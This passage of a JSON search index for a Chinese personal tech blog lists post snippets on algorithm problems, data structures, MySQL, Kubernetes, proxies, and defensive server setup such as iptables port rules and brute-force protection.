的整数数组的","lvl0":"lc.排序数组的两数之和","lvl1":["双指针算法"],"lvl2":"摘要","objectID":"d4f40915b090ce14db3d6af2de61b2a5","tags":["双指针算法"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8F%8C%E6%8C%87%E9%92%88%E7%AE%97%E6%B3%95/lc.%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/"},{"content":"lc.146.lru缓存 ​ 请你设计并实现一个满足 LRU (最近最少使用) 缓存 约束的数据结构。 实现 LRUCache 类： LRUCache(int capacity) 以 正整数 作为容量 capacity 初始化 LRU 缓存 int get(int key) 如果","lvl0":"lc.146.lru缓存","lvl1":["链表"],"lvl2":"摘要","objectID":"04cd61bf69f30ddaa60d2fd90619d584","tags":["链表"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E9%93%BE%E8%A1%A8/lc.146.lru%E7%BC%93%E5%AD%98/"},{"content":"lc.53.最大子数组和 ​ 给你一个整数数组 nums ，请你找出一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。 子数组 是数组中的一","lvl0":"lc.53.最大子数组和","lvl1":["状态转移dp【有向图的最大长度】"],"lvl2":"摘要","objectID":"6e93b00e69f631983aaf1b2885520d41","tags":["状态转移dp【有向图的最大长度】"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E7%8A%B6%E6%80%81%E8%BD%AC%E7%A7%BBdp%E6%9C%89%E5%90%91%E5%9B%BE%E7%9A%84%E6%9C%80%E5%A4%A7%E9%95%BF%E5%BA%A6/lc.53.%E6%9C%80%E5%A4%A7%E5%AD%90%E6%95%B0%E7%BB%84%E5%92%8C/"},{"content":"毕业论文编辑注意事项 ​ word 参考文献","lvl0":"毕业论文编辑注意事项","lvl1":null,"lvl2":"摘要","objectID":"7edb4171a8f3b80926c2d57972ebaa10","tags":null,"url":"https://lyr-2000.github.io/post/08.%E5%85%B6%E4%BB%96/07.%E6%AF%95%E4%B8%9A%E8%AE%BA%E6%96%87/%E6%AF%95%E4%B8%9A%E8%AE%BA%E6%96%87%E7%BC%96%E8%BE%91%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"},{"content":"微信公众号基本的概念 ​ 1 2 微信公众平台：https://mp.weixin.qq.com/ 微信开放平台：https://open.weixi","lvl0":"微信公众号基本的概念","lvl1":["微信公众号"],"lvl2":"摘要","objectID":"d22cd19b5367732aa754b137708680c8","tags":["微信公众号"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%9F%BA%E6%9C%AC%E7%9A%84%E6%A6%82%E5%BF%B5/"},{"content":"markdown流程图绘制 mermaid 流程图 1 2 3 4 5 6 7 graph LR dev(Dev)--\u0026gt;cidi(ci/build) cidi --\u0026gt; deploy(deploy) deploy --\u0026gt; Ops Ops--\u0026gt; feedback(feedback反馈) feedback --\u0026gt; dev style dev fill: #fff 1 2 3 4 5 6 7 8 9","lvl0":"markdown流程图绘制","lvl1":["markdown"],"lvl2":"摘要","objectID":"ac280efd602914150a44fbad1a68a9d1","tags":["markdown"],"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/markdown/markdown%E6%B5%81%E7%A8%8B%E5%9B%BE%E7%BB%98%E5%88%B6/"},{"content":"云计算 ​ Infrastructure as a service platform as a service software as a service 容器的集群化如何管理？ 我们需要一个 资源管理器 kubernates 的目的： 声明式系统 kubernates的所有公立能力构建在对象","lvl0":"云计算","lvl1":["K8s"],"lvl2":"摘要","objectID":"3419a6065e9a19f684bf97b171e677f1","tags":["K8s"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%8E%9F%E7%90%86/k8s/%E4%BA%91%E8%AE%A1%E7%AE%97/"},{"content":"mysql查询去重总结 ​ 错误做法： distinct 去重 ， distinct去重只能去重单个字段 group by 去重, group by 是用来分组的，不能用于去重 分组查询中选用非分组列","lvl0":"mysql查询去重总结","lvl1":["mysql"],"lvl2":"摘要","objectID":"5071f116bac79711925fd2f60485cbae","tags":["mysql"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/mysql/mysql%E6%9F%A5%E8%AF%A2%E5%8E%BB%E9%87%8D%E6%80%BB%E7%BB%93/"},{"content":"lua语法学习 ​ 课程学习 Lua一般用于嵌入式应用，现在越来越多应用于游戏当中，魔兽世界,愤怒的小鸟都有用到 Lua极易嵌入到其他程序，可当做一","lvl0":"lua语法学习","lvl1":["lua"],"lvl2":"摘要","objectID":"42bf6d047a9a744f4079457a0a055478","tags":["lua"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/lua/lua%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/"},{"content":"时序图绘制 时序图可以直观描述并发进程 时序图是一个二维图，x轴表示对象， y轴表示时间，消息在各对象直接横向传递，依照时间顺序纵向排列 时序图的角","lvl0":"时序图绘制","lvl1":["visio"],"lvl2":"摘要","objectID":"865b9d295d2a1193d3a32d289c4463df","tags":["visio"],"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/visio/%E6%97%B6%E5%BA%8F%E5%9B%BE%E7%BB%98%E5%88%B6/"},{"content":"​ leetcode.25.k个一组翻转链表 ​ 给你一个链表，每 k 个节点一组进行翻转，请你返回翻转后的链表。 k 是一个正整数，它的值小于或等于链表","lvl0":"leetcode.25.k个一组翻转链表","lvl1":["链表"],"lvl2":"摘要","objectID":"a6e954184da577c29b272673e4046322","tags":["链表"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E9%93%BE%E8%A1%A8/leetcode.25.k%E4%B8%AA%E4%B8%80%E7%BB%84%E7%BF%BB%E8%BD%AC%E9%93%BE%E8%A1%A8/"},{"content":"leetcode.717.1比特与2比特字符 ​ 解题思路 1 2 3 4 5 6 7 8 9 10 11 12 class Solution { public: bool isOneBitCharacter(vector\u0026lt;int\u0026gt;\u0026amp; bits) { int ed = bits.size()-1; int i=0; while(i\u0026lt;ed) { if(bits[i]) i+=2; else i++; } return i == ed; } };","lvl0":"leetcode.717.1比特与2比特字符","lvl1":["暴力题"],"lvl2":"摘要","objectID":"3088f90697173cf0ce38c8fe8f90471e","tags":["暴力题"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/%E6%9A%B4%E5%8A%9B%E9%A2%98/leetcode.717.1%E6%AF%94%E7%89%B9%E4%B8%8E2%E6%AF%94%E7%89%B9%E5%AD%97%E7%AC%A6/"},{"content":"剑指offer 53.二叉树的中序后继 ​ 给定一棵二叉搜索树和其中的一个节点 p ，找到该节点在树中的中序后继。如果节点没有中序后继，请返回 null 。 节点","lvl0":"剑指offer 53.二叉树的中序后继","lvl1":["二叉搜索树"],"lvl2":"摘要","objectID":"60bce7ece8cf86c400317142f3802098","tags":["二叉搜索树"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/%E5%89%91%E6%8C%87offer-53.%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E4%B8%AD%E5%BA%8F%E5%90%8E%E7%BB%A7/"},{"content":"剑指offer 33.二叉搜索树的后序遍历序列 ​ 输入一个整数数组，判断该数组是不是某二叉搜索树的后序遍历结果。如果是则返回 true，否则返回 f","lvl0":"剑指offer 33.二叉搜索树的后序遍历序列","lvl1":["二叉搜索树"],"lvl2":"摘要","objectID":"0100a4e0e5987def96d39fda19e99c57","tags":["二叉搜索树"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/%E5%89%91%E6%8C%87offer-33.%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97/"},{"content":"​ 给你一个非负整数 x ，计算并返回 x 的 算术平方根 。 由于返回类型是整数，结果只保留 整数部分 ，小数部分将被 舍去 。 注意：不允许使用任何内置指数函数和","lvl0":"leetcode.69.x的平方根","lvl1":["二分法"],"lvl2":"摘要","objectID":"a5e8b7413e91190fd2a69ee35f67ebfb","tags":["二分法"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E4%BA%8C%E5%88%86%E6%B3%95/leetcode.69.x%E7%9A%84%E5%B9%B3%E6%96%B9%E6%A0%B9/"},{"content":"lc.101.分割等和子集 ​ 给定一个非空的正整数数组 nums ，请判断能否将这些数字分成元素和相等的两部分。 示例 1： 输入：nums = [1,5,11,5] 输出：true","lvl0":"lc.101.分割等和子集","lvl1":["01背包变题"],"lvl2":"摘要","objectID":"d022ec36790b0c8fca9d9a1008803714","tags":["01背包变题"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/01%E8%83%8C%E5%8C%85%E5%8F%98%E9%A2%98/lc.101.%E5%88%86%E5%89%B2%E7%AD%89%E5%92%8C%E5%AD%90%E9%9B%86/"},{"content":"lc.15.三数之和 ​ leetcode. 15.三数之和 给你一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c = 0 ？请你找出所","lvl0":"lc.15.三数之和","lvl1":["双指针算法"],"lvl2":"摘要","objectID":"6453103a5100be28a7dfd1c33d1fbdc8","tags":["双指针算法"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8F%8C%E6%8C%87%E9%92%88%E7%AE%97%E6%B3%95/lc.15.%E4%B8%89%E6%95%B0%E4%B9%8B%E5%92%8C/"},{"content":"lc.22.括号生成算法 ​ 数字 n 代表生成括号的对数，请你设计一个函数，用于能够生成所有可能的并且 有效的 括号组合。 示例 1： 1 2 输入：n = 3 输出","lvl0":"lc.22.括号生成算法","lvl1":["dfs"],"lvl2":"摘要","objectID":"4f570ee77fed84d26ef41f7f680bad36","tags":["dfs"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95-dfs-%E5%9B%9E%E6%BA%AF/dfs/lc.22.%E6%8B%AC%E5%8F%B7%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95/"},{"content":"lc.四数之和 给你一个由 n 个整数组成的数组 nums ，和一个目标值 target 。请你找出并返回满足下述全部条件且不重复的四元组 [nums[a], nums[b], nums[c], nums[d]] （若两个四元组元素一一对","lvl0":"lc.四数之和","lvl1":["双指针算法"],"lvl2":"摘要","objectID":"14c73a04df8e06e135aecad1b25f2718","tags":["双指针算法"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8F%8C%E6%8C%87%E9%92%88%E7%AE%97%E6%B3%95/lc.%E5%9B%9B%E6%95%B0%E4%B9%8B%E5%92%8C/"},{"content":"双指针算法模板 ​ 15. 三数之和 Difficulty: 中等 给你一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 _a，b，c ，_使得 a + b + c = 0 ？请你找出所有","lvl0":"双指针算法","lvl1":["双指针算法"],"lvl2":"摘要","objectID":"51dd7d806060e5fd5b6a47cde5fbcd7a","tags":["双指针算法"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8F%8C%E6%8C%87%E9%92%88%E7%AE%97%E6%B3%95/%E5%8F%8C%E6%8C%87%E9%92%88%E7%AE%97%E6%B3%95/"},{"content":"有重复字符串的排列组合 ​ ​ 面试题 08.08. 有重复字符串的排列组合 Difficulty: **有重复字符串的排列组合。编写一种方法，计算某字符串的所有排列组合。 示例1: 输入","lvl0":"有重复字符串的排列组合","lvl1":["dfs"],"lvl2":"摘要","objectID":"fb7b95f74467ff7c8bc7257ad62f9ee6","tags":["dfs"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95-dfs-%E5%9B%9E%E6%BA%AF/dfs/%E6%9C%89%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%8E%92%E5%88%97%E7%BB%84%E5%90%88/"},{"content":"ac.1057买卖股票4 [三维dp] ​ 给定一个长度为 $N$ 的数组，数组中的第 $i$ 个数字表示一个给定股票在第 $i$ 天的价格。 设计一个算法来计算你所能获取","lvl0":"ac.1057买卖股票4 [三维dp]","lvl1":["状态转移问题【有向图的最大长度】"],"lvl2":"摘要","objectID":"f2a8b27718ae5c393d398e4013d6bdce","tags":["状态转移问题【有向图的最大长度】"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E7%8A%B6%E6%80%81%E8%BD%AC%E7%A7%BBdp%E6%9C%89%E5%90%91%E5%9B%BE%E7%9A%84%E6%9C%80%E5%A4%A7%E9%95%BF%E5%BA%A6/ac.1057%E4%B9%B0%E5%8D%96%E8%82%A1%E7%A5%A84-%E4%B8%89%E7%BB%B4dp/"},{"content":"ac.1049大盗阿福 阿福是一名经验丰富的大盗。趁着月黑风高，阿福打算今晚洗劫一条街上的店铺。 这条街上一共有 $N$ 家店铺，每家店中都有一些现金。","lvl0":"ac.1049.大盗阿福","lvl1":null,"lvl2":"摘要","objectID":"3e77217e032626b6814013a96fd6118c","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E7%8A%B6%E6%80%81%E8%BD%AC%E7%A7%BBdp%E6%9C%89%E5%90%91%E5%9B%BE%E7%9A%84%E6%9C%80%E5%A4%A7%E9%95%BF%E5%BA%A6/ac.1049%E5%A4%A7%E7%9B%97%E9%98%BF%E7%A6%8F/"},{"content":"买卖股票5 给定一个长度为 $N$ 的数组，数组中的第 $i$ 个数字表示一个给定股票在第 $i$ 天的价格。 设计一个算法计算出最大利润。在满足以下约束条件下，你可以","lvl0":"ac.1058买卖股票V","lvl1":null,"lvl2":"摘要","objectID":"05e86a409e102a95dc5ebb40a60953a4","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E7%8A%B6%E6%80%81%E8%BD%AC%E7%A7%BBdp%E6%9C%89%E5%90%91%E5%9B%BE%E7%9A%84%E6%9C%80%E5%A4%A7%E9%95%BF%E5%BA%A6/ac.1058.%E4%B9%B0%E5%8D%96%E8%82%A1%E7%A5%A85%E6%97%B6%E9%97%B4%E9%99%90%E5%88%B6/"},{"content":"给定两个整数 a 和 b，求 a 和 b 之间的所有数字中 0∼9 的出现次数。 例如，a=1024，b=1032 ，则 a 和 b 之间共有 9 个数如下： 1 1024 1025 1026 1027 1028 1029 1030","lvl0":"acwing.338.计数问题","lvl1":null,"lvl2":"摘要","objectID":"a9d169f5e8190702dee660b324712dae","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E6%95%B0%E4%BD%8Ddp%E4%BE%8B%E9%A2%98/ac.338.%E8%AE%A1%E6%95%B0%E9%97%AE%E9%A2%98/"},{"content":"dfs写法模板总结 参考博客 必写： pos: 表示数字的位数 从末位或第一位开始，要根据题目的数字构造性质来选择顺序，一般选择从 a1 到 an 的顺序。初始从 len 开始","lvl0":"dfs写法模板总结","lvl1":null,"lvl2":"摘要","objectID":"4ded067c2bc7ee7c75fbececb748ac90","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E6%95%B0%E4%BD%8Ddp%E4%BE%8B%E9%A2%98/dfs%E5%86%99%E6%B3%95%E6%A8%A1%E6%9D%BF%E6%80%BB%E7%BB%93/"},{"content":"完全背包问题 有 N 种物品和一个容量是 V 的背包，每种物品都有无限件可用。 第 i 种物品的体积是 vi，价值是 wi。 求解将哪些物品装入背包，可使这些物品","lvl0":"完全背包模板问题","lvl1":null,"lvl2":"摘要","objectID":"bb1b286cd86de22c4bdca122897658dd","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E5%AE%8C%E5%85%A8%E8%83%8C%E5%8C%85/%E5%AE%8C%E5%85%A8%E8%83%8C%E5%8C%85%E6%A8%A1%E6%9D%BF%E9%A2%98/"},{"content":"最长上升子序列 给定一个长度为 N 的数列，求数值严格单调递增的子序列的长度最长是多少。 输入格式 第一行包含整数 N 。 第二行包含 N 个整数，表示完整序列","lvl0":"最长上升子序列","lvl1":null,"lvl2":"摘要","objectID":"70d3a959ca726f9563762c984babc3a3","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97%E6%A8%A1%E6%9D%BF%E9%A2%98/easy/%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97/"},{"content":"http代理简单实现 用户请求代理服务器 =》 上游 tcp连接=》回调方法=》拷贝请求数据 =》 请求下游服务器 =\u0026gt; 获得结果回写上游数据 golang连接","lvl0":"http 代理简单实现","lvl1":null,"lvl2":"摘要","objectID":"2ac142b246e1a72eba98713408338691","tags":["tcp/udp基础"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%81%9A%E9%A1%B9%E7%9B%AE/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%BD%91%E5%85%B3%E9%A1%B9%E7%9B%AE/http%E4%BB%A3%E7%90%86%E5%AE%9E%E6%93%8D/http%E4%BB%A3%E7%90%86%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/"},{"content":"nginx tcp代理 参考博客 四层负载和七层负载的区别： 四层代理 其实就是路由转发 实际是 路由转发与反向代理的区别 转发客户端与服务器只会有一次三次握手而代","lvl0":"tcp代理实践","lvl1":null,"lvl2":"摘要","objectID":"773019c2d27f4fdc49566b42973f8fb4","tags":["tcp/udp基础"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%81%9A%E9%A1%B9%E7%9B%AE/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%BD%91%E5%85%B3%E9%A1%B9%E7%9B%AE/tcp%E4%BB%A3%E7%90%86%E5%AE%9E%E8%B7%B5/nginx-%E4%BD%BF%E7%94%A8tcp%E4%BB%A3%E7%90%86/"},{"content":"IPtables 端口策略 1 2 3 4 5 6 7 8 9 10 11 12 iptables -t filter -I INPUT -p tcp --tcp-flags ALL SYN -j REJECT # 上面是 限制 nmap 和所有 连接 iptables -I INPUT -p tcp --dport 80 -j ACCEPT # 下面 是只开放 80 443 端口 iptables -I INPUT -p tcp --dport 443 -j ACCEPT","lvl0":"IPtables是开放端口","lvl1":null,"lvl2":"摘要","objectID":"15163d53594cc238b3b64f5b63acf940","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/%E5%BA%94%E7%94%A8%E5%B1%82%E7%9B%B8%E5%85%B3/iptables%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3/"},{"content":"linux 防爆破的方法记录 事件： 服务器一个 美国的ip一直访问 我的服务器 1 2 : server name = azenv.net 2022-02-14 23:30:49.763 INFO 30259 --- [nio-8081-exec-2] c.g.l.authc.authc2022.AuthcCustomFilter : ip=[173.225.110.122] , url = / 参考阿里云的文档博客 解决办法 如下 1 2 3","lvl0":"linux防爆破","lvl1":null,"lvl2":"摘要","objectID":"28419ab89b9a939fd6e95dd1c78c193a","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/%E5%BA%94%E7%94%A8%E5%B1%82%E7%9B%B8%E5%85%B3/ssh%E9%98%B2%E7%88%86%E7%A0%B4/"},{"content":"nginx 的用法 参考官方文档 NGINX 可以根据特定 IP 地址或客户端计算机的 IP 地址范围允许或拒绝访问。要允许或拒绝访问，请在流上下文或服务器块中使用允许和拒绝指","lvl0":"nginx","lvl1":null,"lvl2":"摘要","objectID":"e3aea877b5dca7747450d8f915fa4888","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/%E5%BA%94%E7%94%A8%E5%B1%82%E7%9B%B8%E5%85%B3/nginx/"},{"content":"拜占庭将军问题 拜占庭将军的问题 参考文章2 参考文章3 分布式系统的挑战 一个分布式系统中，任意一台机器出故障了 不应该影响多台机器 分布式系统遇到的问","lvl0":"raft算法-分布式系统的挑战","lvl1":null,"lvl2":"摘要","objectID":"0ca21071b085380fb9c0050f82683cd5","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%8E%9F%E7%90%86/%E5%88%86%E5%B8%83%E5%BC%8F%E5%9F%BA%E7%A1%80/%E5%88%86%E5%B8%83%E5%BC%8F%E7%AE%97%E6%B3%95/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%8C%91%E6%88%98/"},{"content":"服务器配置https记录 1 2 3 4 5 cd / find -name \u0026#34;www.xxx.crt\u0026#34; # 寻找我原来证书的位置 =\u0026gt; 我忘记 原来证书放哪里了， # 找到证书位置后 /www/server/nginx/conf # 将证书替换 1 2 3 4 5 6 7 8 9","lvl0":"服务器配置https记录","lvl1":null,"lvl2":"摘要","objectID":"62af48b33d0d5042afd1e4fdacc3409f","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AEhttps/%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AEhttps%E8%AE%B0%E5%BD%95/"},{"content":"gin_scaffold企业脚手架工具 请求链路日志打印，涵盖 mysql/redis/request支持多语言错误信息提示以及自定义错误提示 支","lvl0":"gin_scaffold脚手架工具","lvl1":null,"lvl2":"摘要","objectID":"8f767f4872284da1950fef3d4848ab26","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%81%9A%E9%A1%B9%E7%9B%AE/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%BD%91%E5%85%B3%E9%A1%B9%E7%9B%AE/04.gin_scaffold%E8%84%9A%E6%89%8B%E6%9E%B6/"},{"content":"http1.1 与http2的区别 http/2 采用二进制格式 ，而非文本格式 http/2 采用一个链接实现多路复用 使用报头压缩， http/2降低了开销 http/2 让服务器可以将响应主动“推","lvl0":"http基础知识","lvl1":null,"lvl2":"摘要","objectID":"18aea9409b9c2ab9237caba21edd7cc6","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%81%9A%E9%A1%B9%E7%9B%AE/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%BD%91%E5%85%B3%E9%A1%B9%E7%9B%AE/http%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"content":"网络代理和网络转发区别 参考博客 网络转发：是路由器对报文的转发操作，中间可能对数据包修改。 网络代理：用户不直接连接服务器，网络代理去连接。获取","lvl0":"网络代理和网络转发区别","lvl1":null,"lvl2":"摘要","objectID":"dc979c7729358e4a335f6fa9a27f0635","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%81%9A%E9%A1%B9%E7%9B%AE/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%BD%91%E5%85%B3%E9%A1%B9%E7%9B%AE/03.%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E5%92%8C%E7%BD%91%E7%BB%9C%E8%BD%AC%E5%8F%91%E5%8C%BA%E5%88%AB/"},{"content":"代理的种类和原理 四层负载均衡和七层负载均衡的区别 实际上路由转发（四层）与反向代理（七层）的区别 转发客户端与服务器只会有一次三次握手而代理有2","lvl0":"05.代理的种类和原理","lvl1":null,"lvl2":"摘要","objectID":"c5dce13a230450767b02d7ce254416d7","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%81%9A%E9%A1%B9%E7%9B%AE/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%BD%91%E5%85%B3%E9%A1%B9%E7%9B%AE/05.-%E4%BB%A3%E7%90%86%E7%9A%84%E7%A7%8D%E7%B1%BB%E5%92%8C%E5%8E%9F%E7%90%86/"},{"content":"实现tcp代理服务器的方法 监听服务 获取构建新连接对象并设置超时时间和 keepalive 设置方法退出时连接关闭 调用回调接口 